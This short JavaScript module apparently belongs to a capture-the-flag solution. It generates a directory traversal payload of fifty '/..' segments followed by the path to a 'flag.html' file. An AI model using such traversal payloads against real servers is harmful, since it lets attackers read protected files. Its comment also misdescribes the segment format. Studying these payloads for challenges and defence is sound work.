function genstr(n) {
  return "/..".repeat(n) + path.resolve(__dirname, "../flag.html");
}

function getPayload() {
  return genstr(50); // Generate a 50-depth '../' traversal
}

module.exports = { getPayload };